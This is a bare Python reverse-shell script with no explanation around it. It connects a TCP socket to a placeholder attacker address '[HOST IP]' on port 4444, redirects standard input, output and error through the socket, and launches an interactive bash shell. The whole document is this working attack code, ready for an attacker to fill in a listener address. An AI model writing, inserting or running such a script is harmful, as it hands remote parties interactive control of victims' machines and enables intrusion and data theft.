import socket, subprocess, os
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("[HOST IP]", 4444 )) # <- PORT ADRRS
os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)
subprocess.call(["/bin/bash", "-i"])
